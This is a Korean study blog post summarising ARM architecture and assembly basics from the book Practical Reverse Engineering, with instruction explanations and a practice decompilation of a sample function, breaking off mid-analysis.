[{"title":"ARM 리버스 엔지니어링 기초","url":"/2022/07/02/arm-reverse-engineering-basics/","content":"\n    \n    유의사항\n    이 글은 Practical Reverse Engineering 책의 내용을 학습 목적으로 정리하고 일부를 수정하거나 추가한 내용입니다.\n    \n\n개요\nARM 아키텍처의 특징과 인스트럭션을 이해하고, 기초적인 리버스 엔지니어링을 연습해 보겠습니다.\nARM 아키텍처 소개\n1980년대 후반 개발된 ARM 아키텍처는 휴대폰, 자동차, 텔레비전 등 다양한 임베디드 장치에서 사용되고 있습니다. ARM 아키텍처는 ARM 홀딩스가 디자인한 후 다른 회사들에 라이센스를 판매하며, 애플, 퀄컴과 같은 파트너사는 라이센스를 구매하여 자신들의 장치에 사용할 프로세서에 적용합니다. 이들 프로세서는 모두 ARM 레퍼런스 매뉴얼에 정의된 기본적인 인스트럭션 집합과 메모리 모델을 구현하고 있습니다.\n\nARM 아키텍처의 특징\nARM은 RISC 아키텍처로, CISC 아키텍처인 x86/x64와는 몇 가지 다른 점이 있습니다.\n\nARM 인스트럭션 집합은 x86/64에 비해 작지만, 범용 레지스터의 수는 더 많습니다.\n인스트럭션의 길이가 고정되어 있습니다.\n메모리 접근에 load-store 모델을 사용합니다.\n\n데이터를 연산하기 전 반드시 메모리에서 레지스터로 옮겨야 하며, 오직 load와 store 인스트럭션만 메모리에 접근할 수 있습니다.\n\n\n\nARM은 여러 가지의 서로 다른 특권 수준(privileged modes)을 제공하는데, 일단은 편의를 위해 User를 x86/64에서의 Ring 3, Supervisor를 Ring 0로 생각해도 좋습니다.\n\nARM 프로세서는 두 가지 상태(state), ARM과 Thumb으로 동작할 수 있습니다. 이 때 상태는 사용할 인스트럭션 집합과 관련이 있으며, 특권 수준과는 무관합니다. ARM 상태에서 인스트럭션의 길이는 항상 32비트이며, Thumb 상태에서는 16비트 또는 32비트입니다.\n프로세서의 상태는 다음과 같이 결정됩니다.\n\nBX 또는 BLX 인스트럭션으로 분기할 때, 목적지 레지스터의 최하위 비트(LSB)가 1이면 Thumb 상태로 전환합니다.\n현재 CPSR 레지스터의 T 비트가 1이면 Thumb 상태입니다.\n\n대부분의 ARM과 Thumb 인스트럭션은 동일한 니모닉(mnemonic)을 갖고 있지만, Thumb 인스트럭션 중 길이가 32비트인 것은 .w 접미사가 붙습니다.\nARM은 또한 조건부 실행(conditional execution)을 지원합니다. 이는 인스트럭션에 특정한 조건이 함께 인코딩되어 있고, 이 조건을 만족하는 경우에만 실행됨을 의미합니다. 조건부 실행을 사용하면 분기문에 필요한 인스트럭션의 개수를 줄일 수 있어 유용합니다. ARM 상태에서 모든 인스트럭션은 조건부 실행이 가능하지만, 조건의 기본값은 ‘항상 실행함(AL)’ 입니다. Thumb 상태에서는 특별한 인스트럭션 IT 를 사용해야만 조건부 실행이 가능합니다.\n또 다른 ARM의 독특한 기능은 배럴 시프터(barrel shifter)로, 특정한 인스트럭션은 값을 시프트하거나 회전(rotate)시키는 다른 연산을 포함할 수 있습니다. (e.g. MOV R1, R0, LSL #1 은 R0 레지스터를 왼쪽으로 1비트 시프트한 후 R1 레지스터에 대입합니다) 배럴 시프터는 조건부 실행과 마찬가지로 인스트럭션의 개수를 줄이는 데 도움이 됩니다.\n범용 레지스터\nARM 아키텍처는 16개의 32비트 범용 레지스터 R0 , R1 , … , R15 를 제공합니다. 모든 범용 레지스터는 개발자가 자유롭게 사용할 수 있지만, 실제로는 앞의 12개 레지스터만 범용으로 쓰이고 나머지는 특수 레지스터처럼 사용됩니다.\n\nR13 은 스택 포인터(SP)를 나타냅니다.\nR14 는 링크 레지스터(LR)를 나타냅니다.\n\n링크 레지스터(link register)는 함수의 리턴 주소를 보관하는 레지스터로, 일부 인스트럭션에 의해 사용됩니다. (e.g. BL 인스트럭션은 함수를 호출하기 전 항상 LR 에 리턴 주소를 저장합니다)\n\n\nR15 는 프로그램 카운터(PC)를 나타냅니다.\n\nARM 상태에서 PC 는 x86/64와는 다르게, 현재 인스트럭션 주소에 8을 더한 값입니다. (ARM 인스트럭션 2개 뒤의 주소)\nThumb 상태에서 PC 는 현재 인스트럭션 주소에 4를 더한 값입니다. (Thumb 인스트럭션 2개 뒤의 주소)\nPC 레지스터에 주소를 대입할 수 있으며, 대입 즉시 그 주소부터 다음 인스트럭션이 실행됩니다.\ngdb 디버거에서는 PC 레지스터의 값으로 현재 인스트럭션의 주소를 보여주는데, 이는 편의상 PC 가 alias되어있기 때문에 그런 것으로 실제와는 차이가 있음에 유의합니다.\n\n\n\nARM은 현재 프로세서와 실행 흐름의 상태를 CPSR 레지스터에 보관합니다. (APSR 레지스터라고도 합니다) CPSR 레지스터에는 다음을 포함한 다양한 플래그들이 있습니다.\n\nE (엔디언 비트) - ARM은 빅 엔디언 모드와 리틀 엔디언 모드 모두에서 동작할 수 있습니다.\n\n리틀 엔디언은 0, 빅 엔디언은 1이며 대부분의 경우 리틀 엔디언입니다.\n\n\nT (Thumb 비트) - Thumb 상태인 경우 1입니다.\nM (Mode 필드) - 현재 특권 수준(e.g. User, Supervisor)을 의미합니다.\n\n\n보조 프로세서와 시스템 설정\nARM 아키텍처는 확장 인스트럭션과 시스템 설정을 위해 사용되는 보조 프로세서(coprocessors)를 제공합니다. (e.g. x86/64에서는 시스템 설정을 CR0 , CR4 레지스터에, ARM에서는 CP15 레지스터에 보관합니다) 보조 프로세서는 CP0 , CP1 , … , CP15 의 16개가 존재합니다. (코드에서는 P0 , … , P15 로 사용됩니다) CP14 와 CP15 는 디버깅과 시스템 설정을 위해 사용되고, 나머지는 제조사가 특정한 인스트럭션을(e.g. 부동소수점 연산) 구현하기 위해 선택적으로 사용할 수 있습니다.\n각각의 보조 프로세서는 16개의 레지스터와 8개의 opcode를 가지고 있으며, opcode의 시맨틱(semantic)은 프로세서마다 다릅니다. 보조 프로세서에 대한 접근은 오직 MRC , MCR 인스트럭션을 사용한 읽기와 쓰기만 가능합니다. (e.g. MRC P15, 0, R0, C2, C0, 0 은 보조 프로세서 CP15 의 C2 / C0 레지스터를 opcode 0 / 0 으로 읽어 범용 레지스터 R0 에 대입합니다) MRC 와 MCR 인스트럭션 자체는 높은 특권 수준을 요구하지 않지만, 일부 보조 프로세서의 레지스터와 opcode들은 오로지 Supervisor 수준에서만 접근이 가능합니다. 이들 레지스터를 User 수준에서 읽으려 하면 익셉션이 발생할 것입니다.\n인스트럭션 집합의 특징\n조건부 실행이나 배럴 시프터 외에도, ARM 인스트럭션에는 x86에 없는 특징들이 있습니다.\n\n일부 인스트럭션은 레지스터의 범위를 인자로 받을 수 있습니다.\n\ne.g. STM R1, &#123;R6-R10&#125; 은 레지스터 R1 이 가리키는 주소에 R6 , R7 , … , R10 의 5개 값을 순서대로 씁니다.\n연속하지 않는 레지스터들도 쉼표를 사용해서(e.g. &#123;R1,R5,R8&#125;) 인자로 전달할 수 있습니다.\n\n\n일부 인스트럭션은 읽기, 쓰기 이후 선택적으로 베이스 레지스터의 값을 갱신할 수 있습니다.\n\ne.g. STM SP!, &#123;R6-R10&#125; 을 실행하면 SP 의 값은 R10 의 값이 쓰인 주소의 4바이트 뒤로 갱신됩니다.\n\n\n\nLoad와 Store 인스트럭션\nLDR 과 STR\nLDR 과 STR 인스트럭션은 메모리에서 1바이트, 2바이트 또는 4바이트를 읽고 씁니다. 인스트럭션의 문법은 살짝 복잡한데, 오프셋을 지정하거나 베이스 레지스터를 갱신하는 여러 가지 방법이 존재하기 때문입니다. 가장 단순한 경우는 다음과 같습니다.\nLDR Rt, [Rn]        ; Rt = *RnSTR Rt, [Rn]        ; *Rn = Rt\nLDR , STR 인스트럭션은 베이스 레지스터와 오프셋을 인자로 받는데, 오프셋의 형태가 3가지 있고 베이스 레지스터를 갱신하는 방법이 3가지 있습니다. 먼저 3가지의 오프셋 형태를 살펴보겠습니다.\n\n상수가 오프셋인 경우\n\n상수 값(immediate)은 단순히 정수로, 특정 오프셋의 데이터에 접근하기 위해 베이스 레지스터에 더하거나 빼는 경우입니다. (e.g. 구조체, vtable의 특정 필드 접근)\n\n\n\nLDR Rt, [Rn, imm]   ; Rt = *(Rn + imm)STR Rt, [Rn, imm]   ; *(Rn + imm) = Rt\n\n레지스터가 오프셋인 경우\n\n보통 배열에 접근하는데, 인덱스가 런타임에 계산되는 경우입니다.\n\n\n\nLDR Rt, [Rn, Rm]    ; Rt = *(Rn + Rm)STR Rt, [Rn, Rm]    ; *(Rn + Rm) = Rt\n\n레지스터의 정수배가 오프셋인 경우\n\n보통 반복문 안에서 배열을 순회하면서, 원소의 크기 단위로 포인터를 증가시키는 경우입니다.\n\n\n\nLDR Rt, [Rn, Rm, shift]     ; Rt = *(Rn + Rm * shift)STR Rt, [Rn, Rm, shift]     ; *(Rn + Rm * shift) = Rt\n다음으로 베이스 레지스터를 갱신하는 3가지 방법입니다.\n\n오프셋 방식\n\n가장 단순하고 흔한 방식으로, 베이스 레지스터는 절대 갱신되지 않습니다.\n느낌표(!)가 없고 상수가 대괄호 안에 있으면 오프셋 방식입니다.\n\n\n\nLDR Rt, [Rn, offset]        ; Rt = *(Rn + offset)\n\npre-indexed 방식\n\n베이스 레지스터를 먼저 갱신한 후 참조합니다. (C언어의 전위 연산자와 유사)\n\n\n\nLDR Rt, [Rn, offset]!       ; Rt = *(Rn + offset)                            ; Rn = Rn + offset\n\npost-indexed 방식\n\n베이스 레지스터를 먼저 참조한 후 갱신합니다. (C언어의 후위 연산자와 유사)\n\n\n\nLDR Rt, [Rn], offset]       ; Rt = *Rn                            ; Rn = Rn + offset\nLDR 과 pseudo 인스트럭션\n일부 디스어셈블 결과에서 다음과 같이 LDR 을 사용하는 방식을 볼 수도 있습니다.\nLDR.W R8, =0x2932E00        ; LDR R8, [PC, x]LDR R2, =a04d ; &quot;%04d&quot;      ; LDR R2, [PC, y]LDR R3, =__imp_realloc      ; LDR R3, [PC, z]\n이 방식은 사실 pseudo 인스트럭션으로, 디스어셈블러들이 편의상 위와 같이 나타내는 것입니다. 실제로는 PC 를 베이스 레지스터로, 상수를 오프셋으로 하는 PC-relative 방식의 LDR 인스트럭션입니다.\n다른 pseudo 인스트럭션으로 레이블이나 함수의 주소를 레지스터에 대입하는 ADR 인스트럭션이 있습니다. 보통 점프 테이블이나 콜백 구현에 사용되는데, 마찬가지로 내부적으로는 PC-relative 방식의 LDR 인스트럭션입니다.\nADR R5, dword_9528LDRD.W R4, R5, [R5]\nLDM 과 STM\nLDM 과 STM 은 베이스 레지스터가 가리키는 주소에서 여러 개의 값을 한번에 읽고 씁니다.\nLDM&lt;mode&gt; Rn[!], &#123;Rm&#125;STM&lt;mode&gt; Rn[!], &#123;Rm&#125;\nRn 은 베이스 레지스터로, 값을 읽고 쓸 메모리 주소를 가리킵니다. 느낌표(!)는 선택인데, 느낌표가 있으면 베이스 레지스터를 실행 후 갱신함을(writeback) 의미합니다. Rm 은 레지스터들의 범위이며, mode 는 다음과 같이 4가지가 존재합니다.\n\nIA (increment after) - 베이스 주소 부터 값을 읽고 쓰며, writeback은 마지막으로 읽고 쓴 주소 + 4 입니다.\n\n명시된 mode 가 없는 경우 기본값입니다.\n\n\nIB (increment before) - 베이스 주소 + 4 부터 값을 읽고 쓰며, writeback은 마지막으로 읽고 쓴 주소 입니다.\nDA (decrement after) - 베이스 주소 부터 낮은 방향으로(거꾸로) 값을 읽고 쓰며, writeback은 마지막으로 읽고 쓴 주소 - 4 입니다.\nDB (decrement before) - 베이스 주소 - 4 부터 낮은 방향으로(거꾸로) 값을 읽고 쓰며, writeback은 마지막으로 읽고 쓴 주소 입니다.\n\n예를 들어, 다음은 IA 모드와 writeback을 사용하여 여러 값을 읽고 쓰는 예제입니다.\nLDR R6, =memMOV R0, #10MOV R1, #11MOV R2, #12LDM R6!, &#123;R3,R4,R5&#125;STMIA R6!, &#123;R0,R1,R2&#125;\n\nLDM 과 STM 은 한번에 여러 값을 옮길 수 있어, 보통 블록 단위의 복사 등에 사용됩니다. (e.g. 복사할 길이를 컴파일 시점에 알고 있을 경우, memcpy 대신 사용할 수 있습니다) 또한 ARM 상태에서 함수의 시작과 끝에서도 사용되는데, 함수 프롤로그와 에필로그의 역할을 합니다.\n\nSTMFD 와 LDMFD 는 각각 STMDB , LDMIA 의 pseudo 인스트럭션입니다.\n\nSTMFD SP!, &#123;R4-R11,LR&#125;      ; 레지스터와 리턴 주소를 스택에 보관합니다.LDMFD SP!, &#123;R4-R11,PC&#125;      ; 레지스터와 리턴 주소를 꺼내고 반환합니다.\nPUSH 와 POP\nPUSH 와 POP 은 LDM , STM 과 비슷하지만, 두 가지 다른 특징이 있습니다.\n\nPUSH 와 POP 은 SP 를 베이스 주소로 사용합니다.\n실행 후 SP 가 자동으로 갱신됩니다.\n\nARM 아키텍처에서도 스택은 x86/64와 마찬가지로 낮은 방향으로 자랍니다. 문법은 다음과 같으며, &#123;Rn&#125; 에는 레지스터들의 범위를 전달해야 합니다.\nPUSH &#123;Rn&#125;POP &#123;Rn&#125;\n예를 들어, 다음은 PUSH 와 POP 을 이용해 스택에서 값을 읽고 쓰는 예제입니다.\nMOV.W R0, #10MOV.W R1, #11MOV.W R2, #12PUSH &#123;R0,R1,R2&#125;POP &#123;R3,R4,R5&#125;\n\nPUSH 와 POP 은 흔히 Thumb 상태에서 함수의 프롤로그와 에필로그로 사용됩니다.\nPUSH.W &#123;R4-R11,LR&#125;          ; 레지스터와 리턴 주소를 스택에 보관합니다.POP.W &#123;R4-R11,PC&#125;           ; 레지스터와 리턴 주소를 꺼내고 반환합니다.\n함수 호출과 분기\nARM 아키텍처는 목적지 주소를 인코딩한 방식에 따라 함수 호출과 분기를 위한 다양한 인스트럭션을 제공하고 있습니다. 함수 호출의 리턴의 원리는 x86/64와 기본적으로 같지만, 몇 가지 사소한 차이점들이 있습니다.\n\n리턴 주소를 스택이나 링크 레지스터(LR)에 저장할 수 있습니다.\n\n함수 에필로그에서 리턴 시 POP &#123;PC&#125; 와 같이 스랙에서 리턴 주소를 직접 꺼내 PC 에 대입하거나, BX LR 과 같이 링크 레지스터로 분기할 수 있습니다.\n\n\n분기할 때 목적지 주소의 최하위 비트(LSB)에 따라 ARM 상태와 Thumb 상태를 오갈 수 있습니다.\n함수 호출 규약의 차이가 있습니다.\n\n4개 매개변수까지 레지스터 R0 , R1 , R2 , R3 을 통해 전달하며, 나머지는 스택을 통해 전달합니다.\n리턴 값은 R0 에 보관합니다.\n\n\n\n함수 호출과 분기에 사용되는 인스트럭션은 B , BX , BL 과 BLX 가 있습니다.\nB labelBL label\nB 는 단순한 분기로, x86/64에서의 JMP 와 동일합니다. 함수 호출에는 거의 사용되지 않지만, 리턴하지 않는 함수를 호출하기 위해 사용될 수 있습니다. 주로 반복문이나 조건문에서 코드 블록의 시작으로 돌아가거나 탈출하기 위해 사용됩니다. BL 은 branch with link로, 분기 전 LR 에 다음 인스트럭션의 주소를 저장합니다. x86/64에서의 CALL 과 비슷한 인스트럭션입니다. B 와 BL 은 모두 레이블의 오프셋만 인자로 받을 수 있습니다.\nBX Rm\nBX 는 branch and exchange로, B 와 비슷하지만 목적지 주소가 레지스터로 전달되고 ARM과 Thumb 상태를 오갈 수 있습니다. (목적지 주소의 최하위 비트가 1이면 Thumb 상태가 됩니다) 흔히 함수 에필로그에서 리턴을 위해 사용되거나, (i.e. BX LR) 다른 상태의 코드로 분기할 때 사용됩니다.\nBLX labelBLX Rm\nBLX 는 branch with link and exchange로, BL 과 비슷하지만 ARM과 Thumb 상태를 전환할 수 있으며 인자로 레지스터에 보관된 목적지 주소나 레이블의 오프셋 모두를 전달할 수 있습니다. (BLX 가 레이블의 오프셋을 인자로 받는 경우는 반드시 상태를 전환하기 위함입니다) BL과 BLX 는 모두 함수 호출에 사용되는데, BL 는 현재 인스트럭션으로부터 32MB 범위 안에 있는 함수 호출에 사용하며 BLX 는 함수의 주소가 정해지지 않은 (e.g. 함수 포인터) 경우 사용합니다. Thumb 상태에서 BLX 는 주로 라이브러리 함수 호출에 사용되며, ARM 상태에서는 BL 을 대신 사용합니다.\n다음 예제는 어떤 함수를 디스어셈블한 결과인데, 함수 호출과 분기를 위한 인스트럭션이 어떻게 사용되고 있는지 살펴보겠습니다.\nPUSH.W &#123;R4,R5,R11,LR&#125;ADDW R11, SP, #8LDR R3, =__imp_mallocADDS R5, R0, #7BFC.W R5, #0, #3LDR R3, [R3]ADDS.W R0, R5, #8BLX R3MOV R4, R0CBZ R4, loc_100C3AEASRS R3, R5, #0x1FSTR R3, [R4,#4]STR R5, [R4]B loc_100C3B8loc_100C3AE:LDR R1, =aFailed ; &quot;failed...&quot;MOV R2, R5MOVS R0, #7BL fooloc_100C3B8:MOV R0, R4POP.W &#123;R4,R5,R11,PC&#125;\n\n1행의 PUSH.W &#123;R4,R5,R11,LR&#125; 은 함수 프롤로그, 24행의 POP.W &#123;R4,R5,R11,PC&#125; 는 함수 에필로그에 해당합니다.\n8행에서 BLX 를 이용해 malloc 라이브러리 함수를 호출하고 있습니다.\n20행에서 BL 을 이용해 foo 함수를 호출하고 있습니다.\n\n산술 연산\nMOV 인스트럭션은 값을 대입하는 가장 단순한 인스트럭션입니다. 대입하는 값은 상수거나 레지스터의 값, 또는 레지스터의 값에 배럴 시프터를 사용한 값입니다. 배럴 시프터로는 값에 대한 왼쪽 시프트(LSL), 오른쪽 시프트(LSR, ASR), 회전(ROR, RRX)이 가능합니다.\nMOV R0, #0xa            ; R0 = 0xaMOV R0, R7              ; R0 = R7MOV R4, R4, LSR #21     ; R4 = (R4 &gt;&gt; 21)\n기초적인 산술 및 논리 연산 인스트럭션으로는 ADD , SUB , MUL , AND , ORR , EOR 이 있습니다. 다음 예제에서 일부 인스트럭션에는 S 접미사가 붙어 있는데, 산술 연산의 결과에 따라 CPSR 레지스터의 플래그(e.g. zero 비트, negative 비트)를 갱신해야 함을 의미합니다.\n\nx86/64와는 달리, ARM 산술 인스트럭션은 기본적으로 CPSR 을 갱신하지 않습니다.\n\nADD R3, R9              ; R3 = R3 + R9ADD R11, SP, #8         ; R11 = SP + 8ADD R0, R4, LSL #2      ; R0 = (R4 &lt;&lt; 2)SUB SP, SP, #0x1a8      ; SP = SP - 0x1a8MUL R2, R3, R5          ; R2 = R3 * R5 (결과의 하위 32비트만 저장됩니다)ANDS R2, R4, #7         ; R2 = R4 &amp; 7 (CPSR을 갱신합니다)EOR R3, R3, R1, LSL #3  ; R3 = R3 ^ (R1 &lt;&lt; 3)EORS R3, R2             ; R3 = R3 ^ R2 (CPSR을 갱신합니다)ORR R3, R3, R2, LSL #8  ; R3 = R3 | (R2 &lt;&lt; 8)ORRS R3, R3, #2         ; R3 = R3 | 2 (CPSR을 갱신합니다)ORRS R3, R2             ; R3 = R3 | R2 (CPSR을 갱신합니다)\nMUL 인스트럭션은 결과의 하위 32비트만이 목적지 레지스터에 저장되며, 64비트 값 전체가 필요한 경우 SMULL , UMALL 인스트럭션을 사용해야 합니다. 또한 나눗셈 인스트럭션이 존재하지 않는데, (ARMv7-R과 ARMv7-M에 SDIV , UDIV 인스트럭션이 있기는 합니다) 실제로는 나눗셈을 소프트웨어적으로 구현하여 필요한 경우 호출하도록 합니다.\nMOV R1, R8MOV R0, R6BL __rt_udiv            ; 소프트웨어적으로 구현한 나눗셈 함수\n조건부 분기와 실행\n반복문과 조건문애서 사용되는 조건부 분기는 CPSR 레지스터에서 다음과 같은 플래그들을 사용합니다.\n\nN (negative flag) - 결과가 음수인 경우 (최상위 비트가 1인 경우) 1입니다.\nZ (zero flag) - 결과가 0이면 1입니다.\nC (carry flag) - 부호가 없는 연산의 결과 오버플로우가 발생하면 1입니다.\nV (overflow flag) - 부호가 있는 연산의 결과 오버플로우가 발생하면 1입니다.\nIT (if-then bits) - Thumb 상태의 IT 인스트럭션에서 조건부 분기의 조건들에 해당하는데, 뒤에서 자세히 설명합니다.\n\n인스트럭션은 다음과 같이 조건을 나타내는 접미사 중 하나를 붙여 조건부로 실행할 수 있습니다.\n\ne.g. BLT 는 아래 표에서 LT 조건이 참인 경우에만 분기하라는 의미로, x86/64에서의 JL 과 같습니다.\n\n\n\n\n접미사\n의미\n플래그\n\n\n\n\nEQ\nEqual\nZ == 1\n\n\nNE\nNot equal\nZ == 0\n\n\nMI\nMinus, negative\nN == 1\n\n\nPL\nPlus, positive or zero\nN == 0\n\n\nHI\nUnsigned higher/above\nC == 1 and Z == 0\n\n\nLS\nUnsigned lower/below\nC == 0 or Z == 1\n\n\nGE\nSigned greater than or equal\nN == V\n\n\nLT\nSigned less than\nN != V\n\n\nGT\nSigned greater than\nZ == 0 and N == V\n\n\nLE\nSigned less than or equal\nZ == 1 or N != V\n\n\n\n비교를 위한 인스트럭션으로 CBZ , CMP , TST , CMN , TEQ 가 있으며, 비교 인스트럭션은 기본값으로 CPSR 을 갱신하지 않는 다른 인스트럭션과 달리 CPSR 의 플래그들을 자동으로 갱신합니다.\n가장 흔한 비교 인스트럭션은 CMP 로, Rn 은 레지스터이고 Operand2 는 상수, 레지스터의 값 또는 레지스터의 값에 배럴 시프터를 사용한 값입니다. CMP 는 x86/64에서와 같이 Rn - Operand2 를 연산하고, CPSR 을 갱신한 후 결과를 버립니다.\nCMP Rn, Operand2\n다음 여러 블록이 있는 조건문에서 조건 분기가 사용되는 예제입니다.\nCMP.W R3, R7, ASR #31BLT loc_lessBGT loc_greaterCMP R5, R7BLS loc_lessloc_greater:SUBS R5, #7SBC.W LR, LR, #0loc_less:UMULL.W R1, R2, R5, R8SMULL.W R0, R4, R7, R8MLA.W R3, LR, R8, R2\nif (R3 &lt; R7) &#123; goto loc_less; &#125;else if (R3 &gt; R7) &#123; goto loc_greater; &#125;else if (R5 &lt; R7) &#123; goto loc_less; &#125;\n다음으로 흔한 비교 인스트럭션은 TST 로, CMP 와 문법이 같습니다. 마찬가지로 x86/64의 TEST 와 같이 Rn &amp; Operand2 를 연산하고, CPSR 을 갱신한 후 결과를 버립니다. TST 는 주로 어떤 값이 다른 값과 동일한지, 또는 특정 플래그를 검사하기 위해 사용합니다.\nTST Rn, Operand2\n다음은 특정 비트를 검사하여 참인 경우 분기하는 예제입니다.\nLDRH R3, [R5,#0x14]TST.W R3, #2BEQ loc_10179DA; ...loc_10179BE:LDRH R2, [R5,#0x14]TST.W R2, #4BEQ loc_10179E8\nCBZ 와 CBNZ 는 Thumb 상태에서 자주 쓰이는 비교 인스트럭션입니다. CBZ 는 레지스터 Rn 의 값이 0이면 label 로 분기하고, CBNZ 는 0이 아니면 분기합니다. 이들 인스트럭션은 주로 정수형 변수의 값이 0인지, 또는 포인터가 NULL 인지 검사하기 위해 사용합니다.\nCBZ Rn, labelCBNZ Rn, label\n다음은 함수가 반환한 포인터가 NULL 인지 검사하는 예제입니다.\nBL foo              ; 함수 foo는 포인터를 반환합니다.CBZ R0, loc_100BC8E; ...loc_100BCE:MOVS R0, #1B locret_100BCE4; ...locret_100BCE4:POP.W &#123;R3-R8,R11,PC&#125;\na = foo(...);if (a == NULL) &#123; return 1; &#125;\n분기 인스트럭션 B 에 조건 접미사를 붙이면 (e.g. BEQ , BLE , BLT , BLS) 조건 분기를 수행합니다. 대부분의 ARM 인스트럭션에는 조건 접미사를 붙여 조건부 실행이 가능하며, 조건이 참이 아닌 경우 그 인스트럭션은 NOP 와 같이 취급합니다. 이러한 조건부 실행은 분기에 필요한 인스트럭션의 수를 줄이는 데 도움이 됩니다.\n다음은 포인터가 NULL 이 아닌 경우 구조체의 특정 필드를 반환하는 예제입니다.\nCMP R0, #0MOVEQ R0, #1LDRNEB R0, [R0,#0x48]BX LR\nif (a == NULL) &#123; return 1; &#125;else &#123; return a-&gt;off_48; &#125;\nThumb 상태에서의 조건부 실행\nThumb 상태에서는 IT (if-then) 인스트럭션을 사용해야만 조건부 실행이 가능합니다. (B 는 예외입니다)\nITxyz cc\nIT 인스트럭션은 뒤따르는 최대 4개의 인스트럭션까지 조건부로 실행될 수 있도록 합니다. cc 는 첫째 인스트럭션의 실행 조건이며, x , y , z 는 각각 둘째, 셋째, 넷째 인스트럭션의 조건을 나타냅니다. 이 3개의 조건은 T 또는 E 로만 나타낼 수 있습니다.\n\nT - cc 가 참이면 실행합니다.\nE - cc 가 거짓이면 실행합니다.\n\n다음은 if-else 블록을 IT 인스트럭션으로 작성한 예제입니다.\nCMP R3, #0          ; 비교 인스트럭션으로, CPSR을 갱신합니다.ITEE NE             ; IT 블록을 시작합니다.CLZNE.W R0, R12     ; 첫째 인스트럭션은 비교의 결과 NE 조건이 참이면 실행됩니다.CLZEQ.W R0, R6      ; 둘째 인스트럭션은 NE 조건이 거짓이면 실행됩니다.ADDEQ R0, #0x20     ; 셋째 인스트럭션은 NE 조건이 거짓이면 실행됩니다.\nif (R3 != 0) &#123;    R0 = countleadzeros(R12);&#125; else &#123;    R0 = countleadzeros(R6);    R0 += 0x20;&#125;\nSwitch-case 구문\nSwitch-case 구문은 여러 묶음의 if-else 블록과 같습니다. 컴파일 시점에 각 case 블록의 위치를 알 수 있으므로, 컴파일러는 점프 테이블을 생성하여 switch-case 구문을 처리합니다. ARM 상태에서는 점프 테이블에 각 case 블록의 주소를, Thumb 상태에서는 블록의 오프셋을 저장합니다. 런타임에서는 점프 테이블을 읽고 목적지 주소를 PC 로 불러들이는 간접 분기(indirect branch)를 수행합니다.\n다음은 ARM 상태에서 switch-case 구문의 예제입니다. ARM 상태에서 간접 분기는 PC 를 목적지 레지스터로 하는 LDR 인스트럭션을 사용합니다.\nCMP R1, #0xb                ; R1이 case인데, 점프 테이블의 범위 안에 있는지 확인합니다.LDRLS PC [PC,R1,LSL#2]      ; 범위 안에 있으면 점프 테이블을 읽고 PC에 대입하여 분기합니다.B loc_DD10                  ; 범위 안에 없으면 break합니다.DCD loc_DD3C                ; 점프 테이블입니다.DCD loc_DD4C; ...DCD loc_DCEC                ; 인덱스 8 (case 8에 해당)DCD loc_DCEC                ; 인덱스 9 (case 9에 해당)DCD loc_DD3CDCD loc_DD3Cloc_DCEC:                   ; case 8, 9에 해당하는 코드 블록입니다.MOV R0, #0SUB R1, R1, #8MOV R3, #4STR R0, [R2,#0x14]STRH R3, [R2,#0x1c]STR R1, [R2,#0x10]\nThumb 상태에서는 점프 테이블에 case 블록의 주소가 아닌 오프셋을 보관합니다. 간접 분기는 특수한 인스트럭션 TBB 와 TBH 를 사용하는데, 점프 테이블의 값에 2를 곱하고 PC 에 더하여 case 블록의 주소를 얻습니다.\nCMP R1, #0xb                ; R1이 case인데, 점프 테이블의 범위 안에 있는지 확인합니다.BHI loc_101E6F2             ; 범위 안에 없으면 break합니다.MOVS R6, #4TBB.W [PC,R1]               ; 점프 테이블을 읽고 분기합니다.DCB 6                       ; 점프 테이블입니다.DCB 0xf; ...DCB 0x6d                    ; 인덱스 8 (case 8에 해당)DCB 0x6d                    ; 인덱스 9 (case 9에 해당)DCB 6DCB 6; ...loc_101E6E4:                ; case 8, 9에 해당하는 코드 블록입니다.SUBS.W R3, R1, #8MOVS R0, #0STR R0, [R4,#0x14]\n리버스 엔지니어링 연습\n지금까지 살펴본 내용을 바탕으로, 예제 함수를 직접 리버스 엔지니어링해보면서 연습해 보겠습니다. 함수를 호출하는 코드는 다음과 같으며, 함수의 코드는 그래프로 나타내었습니다.\nLDR R3, [SP,#0x5c]LDR R2, [SP,#0x58]MOV R1, R10MOV R0, R4BL unk_function\n\n다음은 함수의 코드를 보고 빠르게 확인할 수 있는 사실들입니다.\n\n함수는 최대 4개의 인자를 받고, 불리언형을 리턴합니다.\n\n함수 호출 코드에서 R0 , R1 , R2 , R3 에 값을 대입하고, 함수의 리턴 직전 R0 에 대입되는 값은 0 아니면 1이기 때문입니다\n\n\n첫번째, 두번째 인자는 구조체의 포인터라고 추측할 수 있습니다.\n\n3행, 4행 등에서 R0 과 R1 이 LDR 인스트럭션의 베이스 주소로 사용되며, 상수 오프셋에 접근하고 있기 때문입니다.\n\n\n세번째, 네번째 인자의 자료형은 정수입니다.\n\n14행, 15행에서 AND , ORR 연산의 인자로 사용되고 있기 때문입니다.\n\n\n\n이를 바탕으로 함수의 프로토타입을 추측할 수 있습니다.\nBOOL unk_function(struct1 *, struct2 *, int, int)\n다음으로는 식별된 구조체들의 형태를 살펴보겠습니다.\n\n3~6행에서 struct1 의 [R0, #8] 과 struct2 의 [R1, #0x18] 을 비교하고 있습니다.\n\n두 필드는 동일한 타입이고, 정수형임을 추측할 수 있습니다.\n\n\n8행에서 struct1 의 [R0, #0x10] 을 읽고 2와 비교하는데, LDRH (load half word) 인스트럭션을 사용하고 있어 short 타입임을 알 수 있습니다.\n11~14행에서 struct1 의 [R0, #0x18] . [R0, #0x1c] 을 읽고 각각 세번째, 네번째 인자와 AND 연산을 하고 있어 필드의 타입이 정수형임을 추측할 수 있습니다.\n\nstruct struct1 &#123;    unk8;          // +0x8 ; struct2.unk18과 같은 타입    short unk10;    // +0x10    int unk18;      // +0x18    int unk1c;      // +0x1c&#125;;struct struct2 &#123;    unk18;          // +0x18 ; struct1.unk8과 같은 타입&#125;\n16행까지 분석한 내용을 C 코드로 나타내면 다음과 같습니다.\nBOOL unk_function(struct1 *a1, struct2 *a2, int a3, int a4) &#123;    if (a1.unk8 != s2.unk18        || a1.unk10 != 2        || ((a1.unk18 &amp; a3) | (a1.unk1c &amp; a4)) != 0) &#123;        return 0;    &#125;    // ...&#125;\n이후의 코드를 계속 분석해 보겠습니다.\n\n17행은 struct1 의 [R0, #0xc] 를 R3 에 대입하고, 18행은 [R0] 을 R0 에 대입합니다.\n19행은 R3 + (R3 &lt;&lt; 1) 을 R2 에 대입하는데, 이는 곧 R3 * 3 입니다.\n20행은 struct2 의  [R1, #0xc] 를 R3 에 대입하고, 21행은 다시 [R3, #0xc] 를 R3 에 